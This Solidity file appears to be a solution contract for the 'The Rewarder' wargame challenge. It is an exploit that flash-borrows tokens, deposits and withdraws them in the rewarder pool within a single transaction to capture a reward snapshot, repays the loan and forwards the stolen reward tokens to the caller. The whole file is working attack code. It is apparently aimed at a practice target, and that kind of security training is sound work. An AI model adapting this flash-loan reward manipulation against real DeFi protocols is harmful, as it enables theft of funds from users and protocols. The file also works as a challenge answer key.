// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract TheRewarderAttack {
  TheRewarderPool public rewarderPool;
  FlashLoanerPool public flashLoanerPool;
  IERC20 public liquidityToken;

  constructor (address _rewarderPool, address _flashLoanerPool, address _token) {
    rewarderPool = TheRewarderPool(_rewarderPool);
    flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
    liquidityToken = IERC20(_token);
  }

  function receiveFlashLoan(uint amount) public {
    liquidityToken.approve(address(rewarderPool), amount);
    rewarderPool.deposit(amount);
    rewarderPool.withdraw(amount);

    liquidityToken.transfer(address(flashLoanerPool), amount);
  }

  function attack (uint amount) external {
    flashLoanerPool.flashLoan(amount);
    rewarderPool.rewardToken().transfer(msg.sender, rewarderPool.rewardToken().balanceOf(address(this)));
  }
}